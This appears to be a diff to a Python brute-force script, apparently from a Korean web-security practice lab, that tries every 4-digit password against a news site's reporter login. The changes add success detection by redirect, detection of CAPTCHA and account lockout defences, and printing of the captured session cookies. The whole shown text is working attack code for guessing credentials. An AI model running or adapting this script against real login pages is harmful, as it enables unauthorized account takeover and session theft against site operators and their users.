@@ -36,19 +36,27 @@ for password_num in range(10000):
         # POST 요청 전송 (로그인 시도)
         response = session.post(LOGIN_URL, data=payload, allow_redirects=True)
         
-        # 3. 로그인 실패 조건 확인
-        # 응답 페이지 내용에 실패 문구가 없다면 로그인에 성공한 것으로 판단합니다.
-        if "아이디 또는 비밀번호가 올바르지 않습니다" not in response.text:
+        # 3. 로그인 성공 및 방어 기법 탐지
+
+        # [방어 탐지 1] CAPTCHA 활성화 감지
+        if "자동 입력 방지문자" in response.text:
+            print("\n[-] [방어 탐지] 서버에 CAPTCHA(자동 입력 방지문자)가 활성화되어 브루트 포스가 차단되었습니다.")
+            print("    (실습을 계속하려면 웹사이트에서 보안 모드를 취약 모드로 변경해 주세요: /secure_off.php)")
+            break
+
+        # [방어 탐지 2] 계정 잠금 활성화 감지
+        if "계정이 잠깁니다" in response.text or "계정이 잠겼습니다" in response.text:
+            print("\n[-] [방어 탐지] 비밀번호 오류 누적으로 계정이 잠겼습니다 (Lockout Policy 적용됨).")
+            break
+
+        # [성공 판정] 긍정 조건 검사: 기자 페이지로 리다이렉트되었거나 로그인 완료 상태 확인
+        if response.url.endswith("/reporter/write.php") or "logout.php" in response.text or "기자 취재기사 송고 시스템" in response.text:
             print(f"\n[+] 로그인 성공 비밀번호 발견!: {current_password}")
             success_password = current_password
             
-            # 성공 시 추가 인증 페이지 접근 확인용 테스트
+            # 성공 시 세션 정보 및 기자 페이지 접근 확인
             print(f"[*] 발급받은 세션 쿠키: {session.cookies.get_dict()}")
-            reporter_url = f"{BASE_URL}/reporter/write.php"
-            reporter_res = session.get(reporter_url)
-            
-            if reporter_res.status_code == 200:
-                print("[+] 기자 페이지(/reporter/write.php) 접근에 성공했습니다.")
+            print("[+] 기자 페이지(/reporter/write.php) 접근에 성공했습니다.")
             break
             
     except requests.exceptions.RequestException as e:
@@ -60,4 +68,4 @@ for password_num in range(10000):
         print(f"[*] 현재 테스트 중... ({current_password}/9999)", end="\r")
 
 if not success_password:
-    print("\n[-] 0000부터 9999까지의 범위 내에서 올바른 비밀번호를 찾지 못했습니다.")
+    print("\n[-] 올바른 비밀번호를 찾지 못했거나 보안 정책에 의해 차단되었습니다.")
